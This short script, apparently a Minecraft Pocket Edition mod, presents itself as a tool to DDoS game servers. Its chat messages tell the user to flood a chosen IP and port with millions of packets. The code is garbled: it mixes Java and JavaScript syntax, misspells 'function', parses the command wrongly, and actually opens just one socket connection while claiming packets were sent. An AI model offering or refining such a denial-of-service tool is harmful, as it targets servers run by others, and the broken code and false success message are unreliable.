function newLevel() {
 clientMessage(ChatColor.YELLOW+"Hi there! This mod is to DDoS servers. Try sending 15,000,000 packets.");
 clientMessage(ChatColor.YELLOW+"type '-ddos {ip} {port} {packets}' in chat to ddos the server.");
 clientMessage(ChatColor.YELLOW+"Packets are the number of times to query the server");
 clientMessage(ChatColor.YELLOW+"The server will overload with packets eventually");
}
function procCmd(command){
 var cmd = command.split("-");
 if(cmd[0] == "ddos"){
  if(cmd[3] !== null){
  String ip = cmd[1];
  int port = Integer.parseInt(cmd[2]);
  int packets = Integer.parseInt(cmd[3]);
  ping = pingHost(ip, port, packets);
  if(ping == true){
  clientMessage(ChatColor.GREEN+"Sent " + cmd[3] + " Packets to " + cmd[1] + cmd[2] + "!");
  
  }else{
  clientMessage(ChatColor.RED+"Something went wrong. Make sure you used the command right!");
 }
}
}
}

functioon pingHost(String host, int port, int packets) {
    try (Socket socket = new Socket()) {
        socket.connect(new InetSocketAddress(host, port), packets);
        return true;
    } catch (IOException e) {
        return false;
    }
}
